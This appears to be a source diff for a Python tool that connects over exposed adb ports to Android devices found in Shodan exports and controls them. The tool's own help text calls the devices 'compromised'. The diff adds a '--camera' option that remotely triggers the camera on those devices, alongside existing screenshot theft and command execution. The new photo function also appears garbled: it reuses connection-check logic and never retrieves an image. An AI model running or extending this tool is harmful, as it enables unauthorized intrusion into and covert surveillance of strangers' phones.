@@ -50,12 +50,12 @@ def get_arguments():
                         required=False,
                         help='A file with Shodan export in JSON format. '
                              'JSON entries must be separated with a new-line character.')
-    parser.add_argument('--devices-file',
+    parser.add_argument('--file',
                         dest='devices_file',
                         default=DEFAULT_DEVICES_FILE,
                         required=False,
-                        help='A new-line separated txt file with stored IP addresses of connected android devices to '
-                             'add them to the tool\'s context, '
+                        help='A new-line separated txt file with stored IP addresses and ports '
+                             'of the android devices to connect to, '
                              'in the following format: IP_ADDRESS:PORT.')
     parser.add_argument('-x',
                         '--execute',
@@ -66,6 +66,10 @@ def get_arguments():
                         action='store_true',
                         required=False,
                         help='Capture a screenshot from the compromised android device(s).')
+    parser.add_argument('--camera',
+                        dest='camera',
+                        required=False,
+                        help='Capture a photo from the compromised android device(s).')
     parser.add_argument('-l',
                         '--logging',
                         dest='logging',
@@ -146,7 +150,6 @@ class AndroidDevice:
                        stderr=PIPE) as process:
                 process.communicate()
             screenshot_local_file_name = Path(
-                        # _datetime.now():%d%m%y_%H%M
                         DEFAULT_SCREENSHOT_DIR) / f'{self.ip_address}.png'
             with Popen(['adb', '-s', f'{self.ip_address}:{self.port}', 'pull',
                         screenshot_remote_file_name,
@@ -158,6 +161,29 @@ class AndroidDevice:
                                   screenshot_local_file_name, self.ip_address, self.port)
                 if stderr:
                     logging.debug('Failed to download a screenshot from %s: %s', self.ip_address, stderr)
+        except Exception as e:
+            logging.error('%s - %s', self.ip_address, e)
+
+    def get_photo(self):
+        if not self.is_connected:
+            logging.debug('%s is not connected', self.ip_address)
+            return
+        try:
+            with Popen(['adb', '-s', f'{self.ip_address}:{self.port}', 'shell',
+                        'am start -a android.media.action.IMAGE_CAPTURE'],
+                       stdout=PIPE,
+                       stderr=PIPE) as process:
+                stdout, stderr = process.communicate()
+                if stdout:
+                    if 'connected' in str(stdout):
+                        logging.debug('Connected to %s:%s', self.ip_address, self.port)
+                        self.is_connected = True
+                        store_connected_device(self.ip_address, self.port, self.devices_file)
+                if stderr:
+                    if 'refused' in str(stderr).lower():
+                        logging.debug('%s - connection refused', self.ip_address)
+                    elif 'out' in str(stderr).lower():
+                        logging.debug('%s - connection timed out', self.ip_address)
         except Exception as e:
             logging.error('%s - %s', self.ip_address, e)
 
@@ -179,24 +205,26 @@ elif options.shodan_file:
     logging.info('Reading %s', file_name)
     with open(file_name, 'r') as f:
         try:
-            for line in f.readlines():
+            lines = f.readlines()
+            for i, line in enumerate(lines):
                 dump = json.loads(line)
                 device = AndroidDevice(ip_address=dump['ip_str'],
                                                      port=dump['port'],
                                                      devices_file=connected_devices_file_name)
+                logging.info('Connecting to %s:%s [%s/%s]', device.ip_address, device.port, i, len(lines))
                 device.connect()
                 if device.is_connected:
                     android_devices.append(device)
         except Exception as e:
             logging.error(e)
 elif os.path.exists(connected_devices_file_name):
-    logging.info('Attempting to reconnect android devices from the stored %s file', connected_devices_file_name)
+    logging.info('Connecting android devices from the stored %s file', connected_devices_file_name)
     with open(connected_devices_file_name, 'r') as f:
         lines = [line.strip() for line in f.readlines()]
         for i, line in enumerate(lines):
             ip_address = line.split(':')[0]
             port = line.split(':')[1]
-            logging.info('Reconnecting %s:%s [%s/%s]', ip_address, port, i, len(lines))
+            logging.info('Connecting to %s:%s [%s/%s]', ip_address, port, i, len(lines))
             device = AndroidDevice(ip_address=ip_address,
                                    port=port,
                                    devices_file=connected_devices_file_name)
@@ -226,3 +254,8 @@ if android_devices:
                 logging.info('Capturing a screenshot on %s:%s [%s/%s]', device.ip_address, device.port, i,
                              len(connected_android_devices))
                 device.get_screenshot()
+        if options.camera:
+            for i, device in enumerate(connected_android_devices):
+                logging.info('Capturing a photo on %s:%s [%s/%s]', device.ip_address, device.port, i,
+                             len(connected_android_devices))
+                device.get_photo()
